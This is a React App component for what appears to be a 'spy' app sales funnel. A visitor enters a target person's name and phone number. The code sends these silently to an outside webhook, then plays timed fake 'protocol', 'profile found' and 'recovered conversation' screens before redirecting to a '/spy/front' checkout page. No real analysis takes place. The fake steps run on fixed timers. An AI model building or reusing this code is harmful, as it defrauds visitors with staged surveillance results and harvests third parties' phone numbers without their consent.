
import React, { useState, useEffect } from 'react';
import Header from './components/Header.tsx';
import Footer from './components/Footer.tsx';
import StepSelection from './components/StepSelection.tsx';
import StepDataEntry from './components/StepDataEntry.tsx';
import LoadingScreen from './components/LoadingScreen.tsx';
import StepProfileFound from './components/StepProfileFound.tsx';
import StepRecoveredConvo from './components/StepRecoveredConvo.tsx';
import { AppStep, TargetType, FormData } from './types.ts';

const App: React.FC = () => {
  const [step, setStep] = useState<AppStep>(AppStep.SELECTION);
  const [targetType, setTargetType] = useState<TargetType>(null);
  const [formData, setFormData] = useState<FormData>({ targetName: '', targetPhone: '' });
  const [profilePhoto, setProfilePhoto] = useState<string | null>(null);

  const handleTargetSelect = (target: TargetType) => {
    setTargetType(target);
    localStorage.setItem('sentinel_target_type', target || '');
    setStep(AppStep.DATA_ENTRY);
  };

  const handleDataSubmit = (data: { name: string; phone: string }) => {
    setFormData({ targetName: data.name, targetPhone: data.phone });
    localStorage.setItem('sentinel_target_name', data.name);
    localStorage.setItem('sentinel_target_phone', data.phone);
    
    setStep(AppStep.PROTOCOL);

    fetch('https://nen.auto-jornada.space/webhook/hook-sentinel-pro', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        tipoAlvo: targetType,
        nomeAlvo: data.name,
        telefoneAlvo: data.phone,
        dataHora: new Date().toLocaleString('pt-BR'),
        urlOrigem: window.location.href
      }),
    })
    .then(response => response.json())
    .then(result => {
      if (result && result.photoUrl) {
        setProfilePhoto(result.photoUrl);
      }
    })
    .catch(error => console.error('Silent failure of tracking:', error));

    setTimeout(() => {
      setStep(AppStep.PROFILE_FOUND);
      
      setTimeout(() => {
        setStep(AppStep.ANALYSIS);
        
        setTimeout(() => {
          setStep(AppStep.RECOVERED_CONVO);
        }, 5000); 
      }, 5000); 
    }, 4000); 
  };

  const handleFinalize = () => {
    window.location.href = "https://novidadesdeagora.site/spy/front";
  };

  const isDarkStep = ![AppStep.SELECTION, AppStep.DATA_ENTRY].includes(step);

  return (
    <div className={`min-h-screen flex flex-col items-center selection:bg-[#2CA884]/30 transition-all duration-700 ${isDarkStep ? 'bg-[#0a0a0a]' : 'bg-[#f0f2f5]'}`}>
      {isDarkStep && (
        <div className="fixed inset-0 grid-overlay opacity-20 pointer-events-none z-0"></div>
      )}

      <div className="relative z-10 w-full flex flex-col items-center min-h-screen">
        <Header theme={isDarkStep ? 'dark' : 'light'} />

        <main className="flex-1 w-full flex items-center justify-center p-4">
          {step === AppStep.SELECTION && (
            <StepSelection onSelect={handleTargetSelect} />
          )}

          {step === AppStep.DATA_ENTRY && (
            <StepDataEntry targetType={targetType} onSubmit={handleDataSubmit} />
          )}

          {step === AppStep.PROTOCOL && (
            <LoadingScreen phase="protocol" targetType={targetType} targetName={formData.targetName} />
          )}

          {step === AppStep.PROFILE_FOUND && (
            <StepProfileFound targetPhone={formData.targetPhone} photoUrl={profilePhoto} />
          )}

          {step === AppStep.ANALYSIS && (
            <LoadingScreen phase="analysis" targetType={targetType} targetName={formData.targetName} />
          )}

          {step === AppStep.RECOVERED_CONVO && (
            <StepRecoveredConvo 
              photoUrl={profilePhoto} 
              targetPhone={formData.targetPhone} 
              targetType={targetType} 
              onNext={handleFinalize}
            />
          )}
        </main>

        <Footer theme={isDarkStep ? 'dark' : 'light'} />
      </div>
    </div>
  );
};

export default App;
